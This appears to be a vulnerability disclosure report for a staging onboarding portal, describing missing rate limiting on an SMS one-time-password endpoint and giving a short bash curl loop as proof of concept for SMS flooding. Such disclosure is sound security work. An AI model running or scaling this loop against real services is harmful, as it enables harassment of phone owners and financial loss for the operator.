# Missing Rate Limiting on SMS OTP Generation Endpoint

## Summary
The Greenlight onboarding portal lacks rate limiting on the SMS OTP generation endpoint (`/onboarding/phone-number`). An unauthenticated attacker can automate requests to this endpoint, triggering unlimited SMS messages to any phone number. This leads to user harassment (SMS bombing), financial loss for Greenlight (SMS gateway fees), and potential resource exhaustion.

## Vulnerability Type
- CWE-770: Allocation of Resources Without Limits or Throttling
- Business Logic Flaw / Denial of Service (SMS Flooding)

## Severity
**P3 (Medium)** - Due to direct financial impact and user harassment potential.

## Affected Component
- Target: `https://onboarding.stage.greenlight.gl-tech.io`
- Endpoint: `POST /onboarding/phone-number?_data=routes%2Fonboarding_.phone-number`

## Steps to Reproduce
**Prerequisites:** A valid `csrf_token` and `__onboarding-session-staging` cookie. These can be obtained by navigating to the onboarding page, opening Developer Tools (F12) -> Network tab, entering a dummy phone number, and capturing the `POST` request.

1. Capture the `POST` request to `/onboarding/phone-number` as a cURL command.
2. Execute the following bash loop to send multiple requests in rapid succession. *(Replace `YOUR_CSRF_TOKEN` and `YOUR_SESSION_COOKIE` with the freshly captured values).*

```bash
for i in {1..9}; do
  curl -s -o /dev/null -w "Request $i: %{http_code}\n" 'https://onboarding.stage.greenlight.gl-tech.io/onboarding/phone-number?_data=routes%2Fonboarding_.phone-number' \
    -X POST \
    -H 'Content-Type: application/x-www-form-urlencoded;charset=UTF-8' \
    -H 'Origin: https://onboarding.stage.greenlight.gl-tech.io' \
    -H 'Cookie: web-routing="[COOKIE]"; __onboarding-session-staging=[COOKIE]' \
    --data-raw "__rvfInternalFormId=%3AR38p%3A&csrf_token=[CSRF_TOKEN]&phoneNumber=(112)+233-44${i}0"
  sleep 0.5
done
